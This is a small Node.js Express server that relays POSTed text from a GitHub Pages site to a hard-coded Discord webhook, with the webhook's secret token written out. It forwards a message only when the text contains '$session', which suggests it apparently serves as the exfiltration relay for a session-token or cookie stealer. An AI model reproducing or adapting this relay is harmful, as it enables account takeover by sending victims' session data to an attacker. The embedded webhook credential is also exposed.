import express from 'express';
import cors from 'cors';
import fetch from 'node-fetch';

const app = express();
const port = process.env.PORT || 10000;

app.use(cors({
  origin: 'https://impatientzz.github.io', // your frontend URL
  methods: ['POST', 'OPTIONS']
}));
app.use(express.json());

const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1363135609601917199/-XCwFzteRcZQW5u98yN9oP86P55-kaErK8QNP8m4p7eaTH1GTuRbaewg9qnx-ljs9J-k';

app.post('/send-webhook', async (req, res) => {
  const { content } = req.body;
  if (!content || !content.includes('$session')) {
    return res.status(400).json({ error: 'Invalid content' });
  }
  try {
    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content }),
    });

    if (!response.ok) {
      const errText = await response.text();
      return res.status(500).json({ error: 'Discord webhook error: ' + errText });
    }

    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Server error: ' + err.message });
  }
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
